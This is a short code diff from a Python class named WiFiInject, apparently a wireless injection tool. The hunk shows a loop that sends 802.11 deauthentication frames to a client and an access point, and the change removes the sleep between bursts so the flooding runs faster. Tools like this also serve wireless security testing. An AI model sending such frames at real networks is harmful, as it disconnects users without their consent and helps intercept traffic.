@@ -447,7 +447,7 @@ class WiFiInject:
 			for seq_num in range(packets):
 				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(seq_num << 4)) / Dot11Deauth(reason=reason_code))
 				self.pcap.sendpacket(deauth_pkt)
-			time.sleep(timeout)
+			#time.sleep(timeout)
 	
 	def beacon(self, ssid, bssid, channel, SC=0):
 		rsn_info = (
